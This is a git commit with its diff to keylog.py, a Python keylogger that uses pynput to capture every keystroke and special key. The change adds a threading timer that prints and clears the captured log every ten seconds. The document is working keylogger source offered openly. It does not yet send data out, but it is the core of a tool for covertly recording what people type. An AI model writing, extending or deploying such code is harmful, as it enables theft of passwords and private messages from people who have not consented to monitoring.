c7c4f39b38dfb7a69d0e4f727638a12bc33ad219
gouthamk-cryptichub <k.goutham2000@gmail.com>
2020-09-03 12:20:04 -0400

    Added threading to avoid instant dumps

--- keylog.py
+++ keylog.py
@@ -1,10 +1,9 @@
 #!/usr/bin/env python
 import pynput.keyboard
+import threading
 
 log = ""
 def use_keys(key):
-    print(key)
-
     global log
     try:
         log += str(key.char)
@@ -13,8 +12,14 @@ def use_keys(key):
             log += " "
         else:
             log += " [" + str(key) + "] "
+def report():
+    global log
     print(log)
+    log = ""
+    timer = threading.Timer(10, report)
+    timer.start()
 
 key_rec = pynput.keyboard.Listener(on_press=use_keys)
 with key_rec:
+    report()
     key_rec.join()
